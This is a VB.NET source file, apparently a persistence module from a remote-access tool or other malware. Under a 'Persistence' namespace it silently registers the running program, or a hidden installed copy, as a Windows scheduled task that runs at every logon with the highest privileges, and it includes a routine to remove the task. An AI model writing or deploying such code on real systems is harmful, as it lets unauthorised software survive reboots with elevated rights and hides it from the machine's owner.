Imports System.IO
Imports System.Security.Principal

Namespace Persistence
    Public Class SchTask
        Public PATHS As String
        Public InstallName As String
        Public HardInstall As Boolean
        Public Sub AddtoSchTask()
            If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then
                Dim installfullpath As FileInfo
                If HardInstall = True Then
                    installfullpath = New FileInfo(Path.Combine(Environ(PATHS), InstallName))
                Else
                    installfullpath = New FileInfo(Application.ExecutablePath)
                End If
                Dim startInfo As ProcessStartInfo = New ProcessStartInfo("schtasks") With {
                    .Arguments = "/create /tn """ & InstallName & """ /sc ONLOGON /tr """ & installfullpath.FullName & """ /rl HIGHEST /f",
                    .UseShellExecute = False,
                    .CreateNoWindow = True
                }
                Dim p As Process = Process.Start(startInfo)
                p.WaitForExit(1000)
                If p.ExitCode = 0 Then Return
            End If
        End Sub
        Public Sub RemoveFromSchTask()
            If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then
                Dim startInfo As ProcessStartInfo = New ProcessStartInfo("schtasks") With {
                    .Arguments = "/delete /tn """ & InstallName & """ /f",
                    .UseShellExecute = False,
                    .CreateNoWindow = True
                }
                Dim p As Process = Process.Start(startInfo)
                p.WaitForExit(1000)
                If p.ExitCode = 0 Then Return
            End If
        End Sub
    End Class
End Namespace
